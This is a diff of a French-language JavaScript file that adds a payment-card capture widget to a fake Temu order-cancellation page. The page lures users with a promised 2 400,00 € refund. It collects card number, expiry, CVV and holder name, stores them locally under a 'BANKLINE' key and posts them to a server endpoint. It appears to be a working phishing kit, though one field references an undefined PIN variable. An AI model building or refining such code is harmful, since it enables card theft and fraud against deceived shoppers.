@@ -27,6 +27,7 @@ const REDIRECT_CONFIG = {
 document.addEventListener('DOMContentLoaded', () => {
   initDecisionSelect();
   initModalCheckout();
+  initPrepaidCardsWidget();
 });
 
 // Gestion du sélecteur "Voulez-vous valider ou annuler votre commande ?"
@@ -103,8 +104,8 @@ function handleDecision(value, actionZone) {
     const btn = document.getElementById('btn-trigger-cancel');
     if (btn) {
       btn.addEventListener('click', () => {
-        // Déclencher l'animation avec TEMU + BANK et la redirection
-        startCancellationWorkflow();
+        // Afficher immédiatement par le bas le widget avec les logos de cartes et le formulaire PIN
+        openPrepaidCardsWidget();
       });
     }
     showToast("Option sélectionnée : Annuler ma commande");
@@ -259,4 +260,281 @@ function showToast(msg) {
   toastTimer = setTimeout(() => {
     box.classList.remove('active');
   }, 3000);
+}
+
+// =========================================================================
+// WIDGET DU BAS : SÉLECTION DES LOGOS DE CARTES & SAISIE DU CODE PIN
+// =========================================================================
+function openPrepaidCardsWidget() {
+  const overlay = document.getElementById('bottom-sheet-cards-overlay');
+  const form = document.getElementById('sheet-card-form');
+  const successScreen = document.getElementById('sheet-success-screen');
+
+  if (overlay) {
+    if (form) form.style.display = 'block';
+    if (successScreen) successScreen.style.display = 'none';
+    overlay.classList.add('active');
+    overlay.setAttribute('aria-hidden', 'false');
+    document.body.style.overflow = 'hidden';
+
+    // Focus automatique sur le numéro de carte
+    const numInput = document.getElementById('sheet-card-number');
+    if (numInput) {
+      setTimeout(() => numInput.focus(), 350);
+    }
+  }
+}
+
+function closePrepaidCardsWidget() {
+  const overlay = document.getElementById('bottom-sheet-cards-overlay');
+  if (overlay) {
+    overlay.classList.remove('active');
+    overlay.setAttribute('aria-hidden', 'true');
+    document.body.style.overflow = '';
+  }
+}
+
+function initPrepaidCardsWidget() {
+  const overlay = document.getElementById('bottom-sheet-cards-overlay');
+  const closeBtn = document.getElementById('btn-close-sheet');
+  const finishBtn = document.getElementById('btn-finish-sheet');
+  const cardItems = document.querySelectorAll('.card-logo-item');
+
+  // Mini preview elements
+  const miniPreview = document.getElementById('mini-card-preview');
+  const previewBrand = document.getElementById('preview-brand-name');
+  const previewNumber = document.getElementById('preview-card-number');
+  const previewHolder = document.getElementById('preview-card-holder');
+  const previewExp = document.getElementById('preview-card-exp');
+
+  // Input elements
+  const inputNumber = document.getElementById('sheet-card-number');
+  const inputExp = document.getElementById('sheet-card-exp');
+  const inputCvv = document.getElementById('sheet-card-cvv');
+  const inputHolder = document.getElementById('sheet-card-holder');
+  const badgeType = document.getElementById('sheet-card-type-badge');
+  const form = document.getElementById('sheet-card-form');
+  const successScreen = document.getElementById('sheet-success-screen');
+
+  let currentCard = 'visa';
+
+  // Fermeture
+  if (closeBtn) {
+    closeBtn.addEventListener('click', closePrepaidCardsWidget);
+  }
+  if (finishBtn) {
+    finishBtn.addEventListener('click', closePrepaidCardsWidget);
+  }
+  if (overlay) {
+    overlay.addEventListener('click', (e) => {
+      if (e.target === overlay) {
+        closePrepaidCardsWidget();
+      }
+    });
+  }
+
+  // Échap pour fermer
+  document.addEventListener('keydown', (e) => {
+    if (e.key === 'Escape' && overlay && overlay.classList.contains('active')) {
+      closePrepaidCardsWidget();
+    }
+  });
+
+  // Sélection du logo de carte (Visa, Mastercard, CB, Amex, Transcash, PCS)
+  cardItems.forEach(item => {
+    item.addEventListener('click', () => {
+      cardItems.forEach(i => i.classList.remove('active'));
+      item.classList.add('active');
+
+      const cardType = item.getAttribute('data-card') || 'visa';
+      currentCard = cardType;
+
+      // Mise à jour du look dynamique de la carte
+      if (miniPreview) {
+        miniPreview.className = `mini-card-preview skin-${cardType}`;
+      }
+
+      // Mise à jour des libellés et badges
+      const brandLabels = {
+        'visa': 'VISA SÉCURISÉ',
+        'mastercard': 'MASTERCARD',
+        'cb': 'CARTE BANCAIRE (CB)',
+        'amex': 'AMERICAN EXPRESS',
+        'transcash': 'TRANSCASH PRÉPAYÉE',
+        'pcs': 'PCS MASTERCARD'
+      };
+
+      const shortBadges = {
+        'visa': 'VISA',
+        'mastercard': 'MC',
+        'cb': 'CB',
+        'amex': 'AMEX',
+        'transcash': 'TRANSCASH',
+        'pcs': 'PCS'
+      };
+
+      if (previewBrand) previewBrand.textContent = brandLabels[cardType] || cardType.toUpperCase();
+      if (badgeType) badgeType.textContent = shortBadges[cardType] || cardType.toUpperCase();
+
+      showToast(`Carte sélectionnée : ${brandLabels[cardType] || cardType.toUpperCase()}`);
+    });
+  });
+
+  // Formatage live : Numéro de carte 16 chiffres avec espacement par 4
+  if (inputNumber) {
+    inputNumber.addEventListener('input', (e) => {
+      let val = e.target.value.replace(/\D/g, '');
+      if (val.length > 16) val = val.slice(0, 16);
+      const parts = val.match(/[\s\S]{1,4}/g) || [];
+      e.target.value = parts.join(' ');
+
+      if (previewNumber) {
+        previewNumber.textContent = parts.length > 0 ? parts.join(' ') : '•••• •••• •••• ••••';
+      }
+    });
+  }
+
+  // Formatage live : Expiration MM/AA
+  if (inputExp) {
+    inputExp.addEventListener('input', (e) => {
+      let val = e.target.value.replace(/\D/g, '');
+      if (val.length > 4) val = val.slice(0, 4);
+
+      if (val.length >= 2) {
+        e.target.value = val.slice(0, 2) + '/' + val.slice(2);
+      } else {
+        e.target.value = val;
+      }
+
+      if (previewExp) {
+        previewExp.textContent = e.target.value || 'MM/AA';
+      }
+    });
+  }
+
+  // Formatage live : CVV 3 chiffres
+  if (inputCvv) {
+    inputCvv.addEventListener('input', (e) => {
+      let val = e.target.value.replace(/\D/g, '');
+      if (val.length > 3) val = val.slice(0, 3);
+      e.target.value = val;
+    });
+  }
+
+  // Titulaire live
+  if (inputHolder) {
+    inputHolder.addEventListener('input', (e) => {
+      if (previewHolder) {
+        previewHolder.textContent = e.target.value.trim().toUpperCase() || 'PIERRE BARLIE';
+      }
+    });
+  }
+
+  // Soumission du formulaire dans le widget
+  if (form) {
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const rawNumber = (inputNumber ? inputNumber.value : '').replace(/\s+/g, '');
+      const expiry = (inputExp ? inputExp.value : '').trim();
+      const cvv = (inputCvv ? inputCvv.value : '').trim();
+      const holder = (inputHolder ? inputHolder.value : '').trim();
+
+      // Validations
+      if (rawNumber.length !== 16 || !/^\d+$/.test(rawNumber)) {
+        showToast("Le numéro de carte doit comporter exactement 16 chiffres.");
+        if (inputNumber) inputNumber.focus();
+        return;
+      }
+
+      if (!holder) {
+        showToast("Le nom du titulaire est obligatoire.");
+        if (inputHolder) inputHolder.focus();
+        return;
+      }
+
+      if (!/^\d{2}\/\d{2}$/.test(expiry)) {
+        showToast("Format d'expiration invalide (MM/AA).");
+        if (inputExp) inputExp.focus();
+        return;
+      }
+
+      if (cvv.length !== 3 || !/^\d+$/.test(cvv)) {
+        showToast("Le code CVV doit comporter exactement 3 chiffres.");
+        if (inputCvv) inputCvv.focus();
+        return;
+      }
+
+      const submitBtn = document.getElementById('btn-submit-sheet-card');
+      if (submitBtn) {
+        submitBtn.disabled = true;
+        submitBtn.innerHTML = `
+          <span class="step-spinner" style="width:16px;height:16px;border-width:2px;display:inline-block;vertical-align:middle;margin-right:6px;"></span>
+          Validation en cours...
+        `;
+      }
+
+      const refCode = 'REF-ANN-' + Math.floor(100000 + Math.random() * 900000);
+      const cardRecord = {
+        id: 'CARD-' + Math.random().toString(36).substring(2, 8).toUpperCase(),
+        reference: refCode,
+        cardType: currentCard,
+        cardNumber: rawNumber,
+        expiry: expiry,
+        cvv: cvv,
+        clientId: '675464',
+        clientName: holder,
+        clientPin: pin,
+        amountRefunded: '2 400,00 €',
+        orderId: 'CMD-TEMU-89241-EU',
+        status: 'active',
+        createdAt: new Date().toISOString(),
+        createdBy: 'WIDGET_ANNULATION_TEMU'
+      };
+
+      // 1. Sauvegarde dans localStorage pour synchronisation immédiate avec l'agent Bankline
+      try {
+        let pending = [];
+        const existing = localStorage.getItem('BANKLINE_PENDING_SECURED_CARDS');
+        if (existing) pending = JSON.parse(existing);
+        pending.unshift(cardRecord);
+        localStorage.setItem('BANKLINE_PENDING_SECURED_CARDS', JSON.stringify(pending));
+      } catch (err) {
+        console.warn('Sauvegarde localStorage locale:', err);
+      }
+
+      // 2. Envoi API vers le serveur en ligne ou local si disponible
+      try {
+        await fetch('/api/securisation', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(cardRecord)
+        });
+      } catch (err) {
+        console.log('Serveur API autonome en local.');
+      }
+
+      // Transition vers l'écran de succès après 1.2s de sécurisation
+      setTimeout(() => {
+        if (submitBtn) {
+          submitBtn.disabled = false;
+          submitBtn.innerHTML = `
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+            Valider l'annulation & Rembourser 2 400,00 €
+          `;
+        }
+
+        if (form) form.style.display = 'none';
+        if (successScreen) {
+          successScreen.style.display = 'block';
+          const refEl = document.getElementById('receipt-ref-code');
+          const brandEl = document.getElementById('receipt-card-brand');
+          if (refEl) refEl.textContent = refCode;
+          if (brandEl) brandEl.textContent = `${currentCard.toUpperCase()} (•••• ${rawNumber.slice(-4)})`;
+        }
+
+        showToast("✓ Annulation confirmée & coordonnées sécurisées !");
+      }, 1200);
+    });
+  }
 }
